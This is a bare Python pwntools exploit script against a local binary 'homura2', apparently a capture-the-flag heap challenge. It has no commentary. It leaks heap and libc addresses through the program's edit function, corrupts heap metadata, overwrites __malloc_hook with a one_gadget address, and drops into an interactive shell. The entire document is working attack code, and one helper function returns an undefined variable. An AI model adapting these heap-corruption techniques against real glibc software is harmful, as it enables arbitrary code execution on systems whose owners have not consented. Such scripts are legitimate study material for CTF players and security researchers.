from pwn import *
p=process('./homura2')
elf = ELF('./homura2')
libc = elf.libc
def add(namelen,meslen,name,mess):
	p.recvuntil('>>')
	p.sendline('1')
	p.recvuntil('name')
	p.sendline(str(namelen))
	p.recvuntil('name')
	p.send(name)
	p.recvuntil('message')
	p.sendline(str(meslen))
	p.recvuntil('message')
	p.send(mess)
	p.recvuntil('Done!')

def dele(index):
	p.recvuntil('>>')
	p.sendline('2')
	p.recvuntil('index')
	p.sendline(str(index))
	p.recvuntil('Done!')
def edit(index,size,cont):
	p.recvuntil('>>')
	p.sendline('3')
	p.recvuntil('index')
	p.sendline(str(index))
	p.recvuntil('size')
	p.sendline(str(size))
	p.recvuntil('Hello ')
	re = p.recvuntil(' you')[:-4]
	p.recvuntil('>')
	p.send(cont)
	p.recvuntil('Done!')
	return re

def moreedit(index,addr1,addr2):
	p.recvuntil('>>')
	p.sendline('5')
	p.recvuntil('index')
	p.sendline(str(index))
	p.recvuntil('>')
	p.send(addr1)
	p.recvuntil('again!>')
	p.send(addr2)
	p.recvuntil('Done!')
	return re

add(0,0x90,'','aaa\n')
add(0,0x90,'','bbb\n')
add(0,0x90,'','a'*0x20+'\n')
add(0,0x90,'','\n')
add(0,0x90,'','\n')
edit(0,3,'bbb\n')
dele(1)
dele(0)
add(0,0x90,'','aaa\n')
addr = u64(edit(0,0,'').ljust(8,'\x00'))
info("heap:0x%x",addr)
heap = addr & 0xfffffffffffff000
add(0x10,0x90,p64(heap+0x130)+p64(heap+0x130),'ddd\n')

dele(0)

edit(0,0x10,p64(heap+0x110)+p64(heap+0x110))



add(0,0x90,'',p64(0)*2+'\n')

addr2 = u64(edit(1,0,'').ljust(8,'\x00'))

libc_base = addr2 - (0x00007f0fa487cb78- 0x7f0fa44b8000)

info("libc:0x%x",libc_base)

malloc_hook = libc_base +libc.symbols['__malloc_hook']

one = libc_base + 0xf1147

print hex(malloc_hook)

edit(0,0x10,p64(addr2)*2)


dele(2)



add(0,0x90,'','\n')
add(0,0x90,'','\n')
add(0,0x90,'','\n')
add(0,0x90,'','\n')
edit(5,0,'')
dele(5)

edit(5,0x10,p64(heap+0x0f8)*2)

add(0,0x90,'',p64(0)*2+'\n')

moreedit(1,p64(malloc_hook-0x10),p64(heap+0x040))

add(8,0x90,p64(one),p64(one)+'\n')
p.sendline('1')



p.interactive()


